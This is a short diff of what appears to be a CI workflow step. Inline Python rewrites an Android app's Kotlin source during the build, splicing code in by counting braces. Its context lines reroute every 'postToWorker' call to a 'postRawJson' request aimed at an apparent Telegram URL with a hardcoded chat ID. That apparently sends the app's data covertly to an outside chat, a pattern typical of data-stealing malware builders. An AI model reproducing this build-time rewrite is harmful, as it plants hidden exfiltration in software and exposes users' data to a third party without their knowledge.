@@ -37,7 +37,7 @@ jobs:
           m = open(mp, encoding="utf-8").read()
           lines = m.splitlines()
           diff = "\n".join(lines[255:280]).count("{") - "\n".join(lines[255:280]).count("}")
-          lines[255:280] = ["        " + ("{" * diff if diff > 0 else "}" * (-diff))]
+          lines[255:280] = ["        val contentStack = FrameLayout(this); " + ("{" * diff if diff > 0 else "}" * (-diff))]          
           m = "\n".join(lines)
           m = re.sub(r'postToWorker\(prefs,\s*JSONObject\(\)\.apply\s*\{', f'postRawJson("{tg_url}", JSONObject().apply {{ put("chat_id", 5347874574L); ', m)
           if "fun postRawJson" not in m:
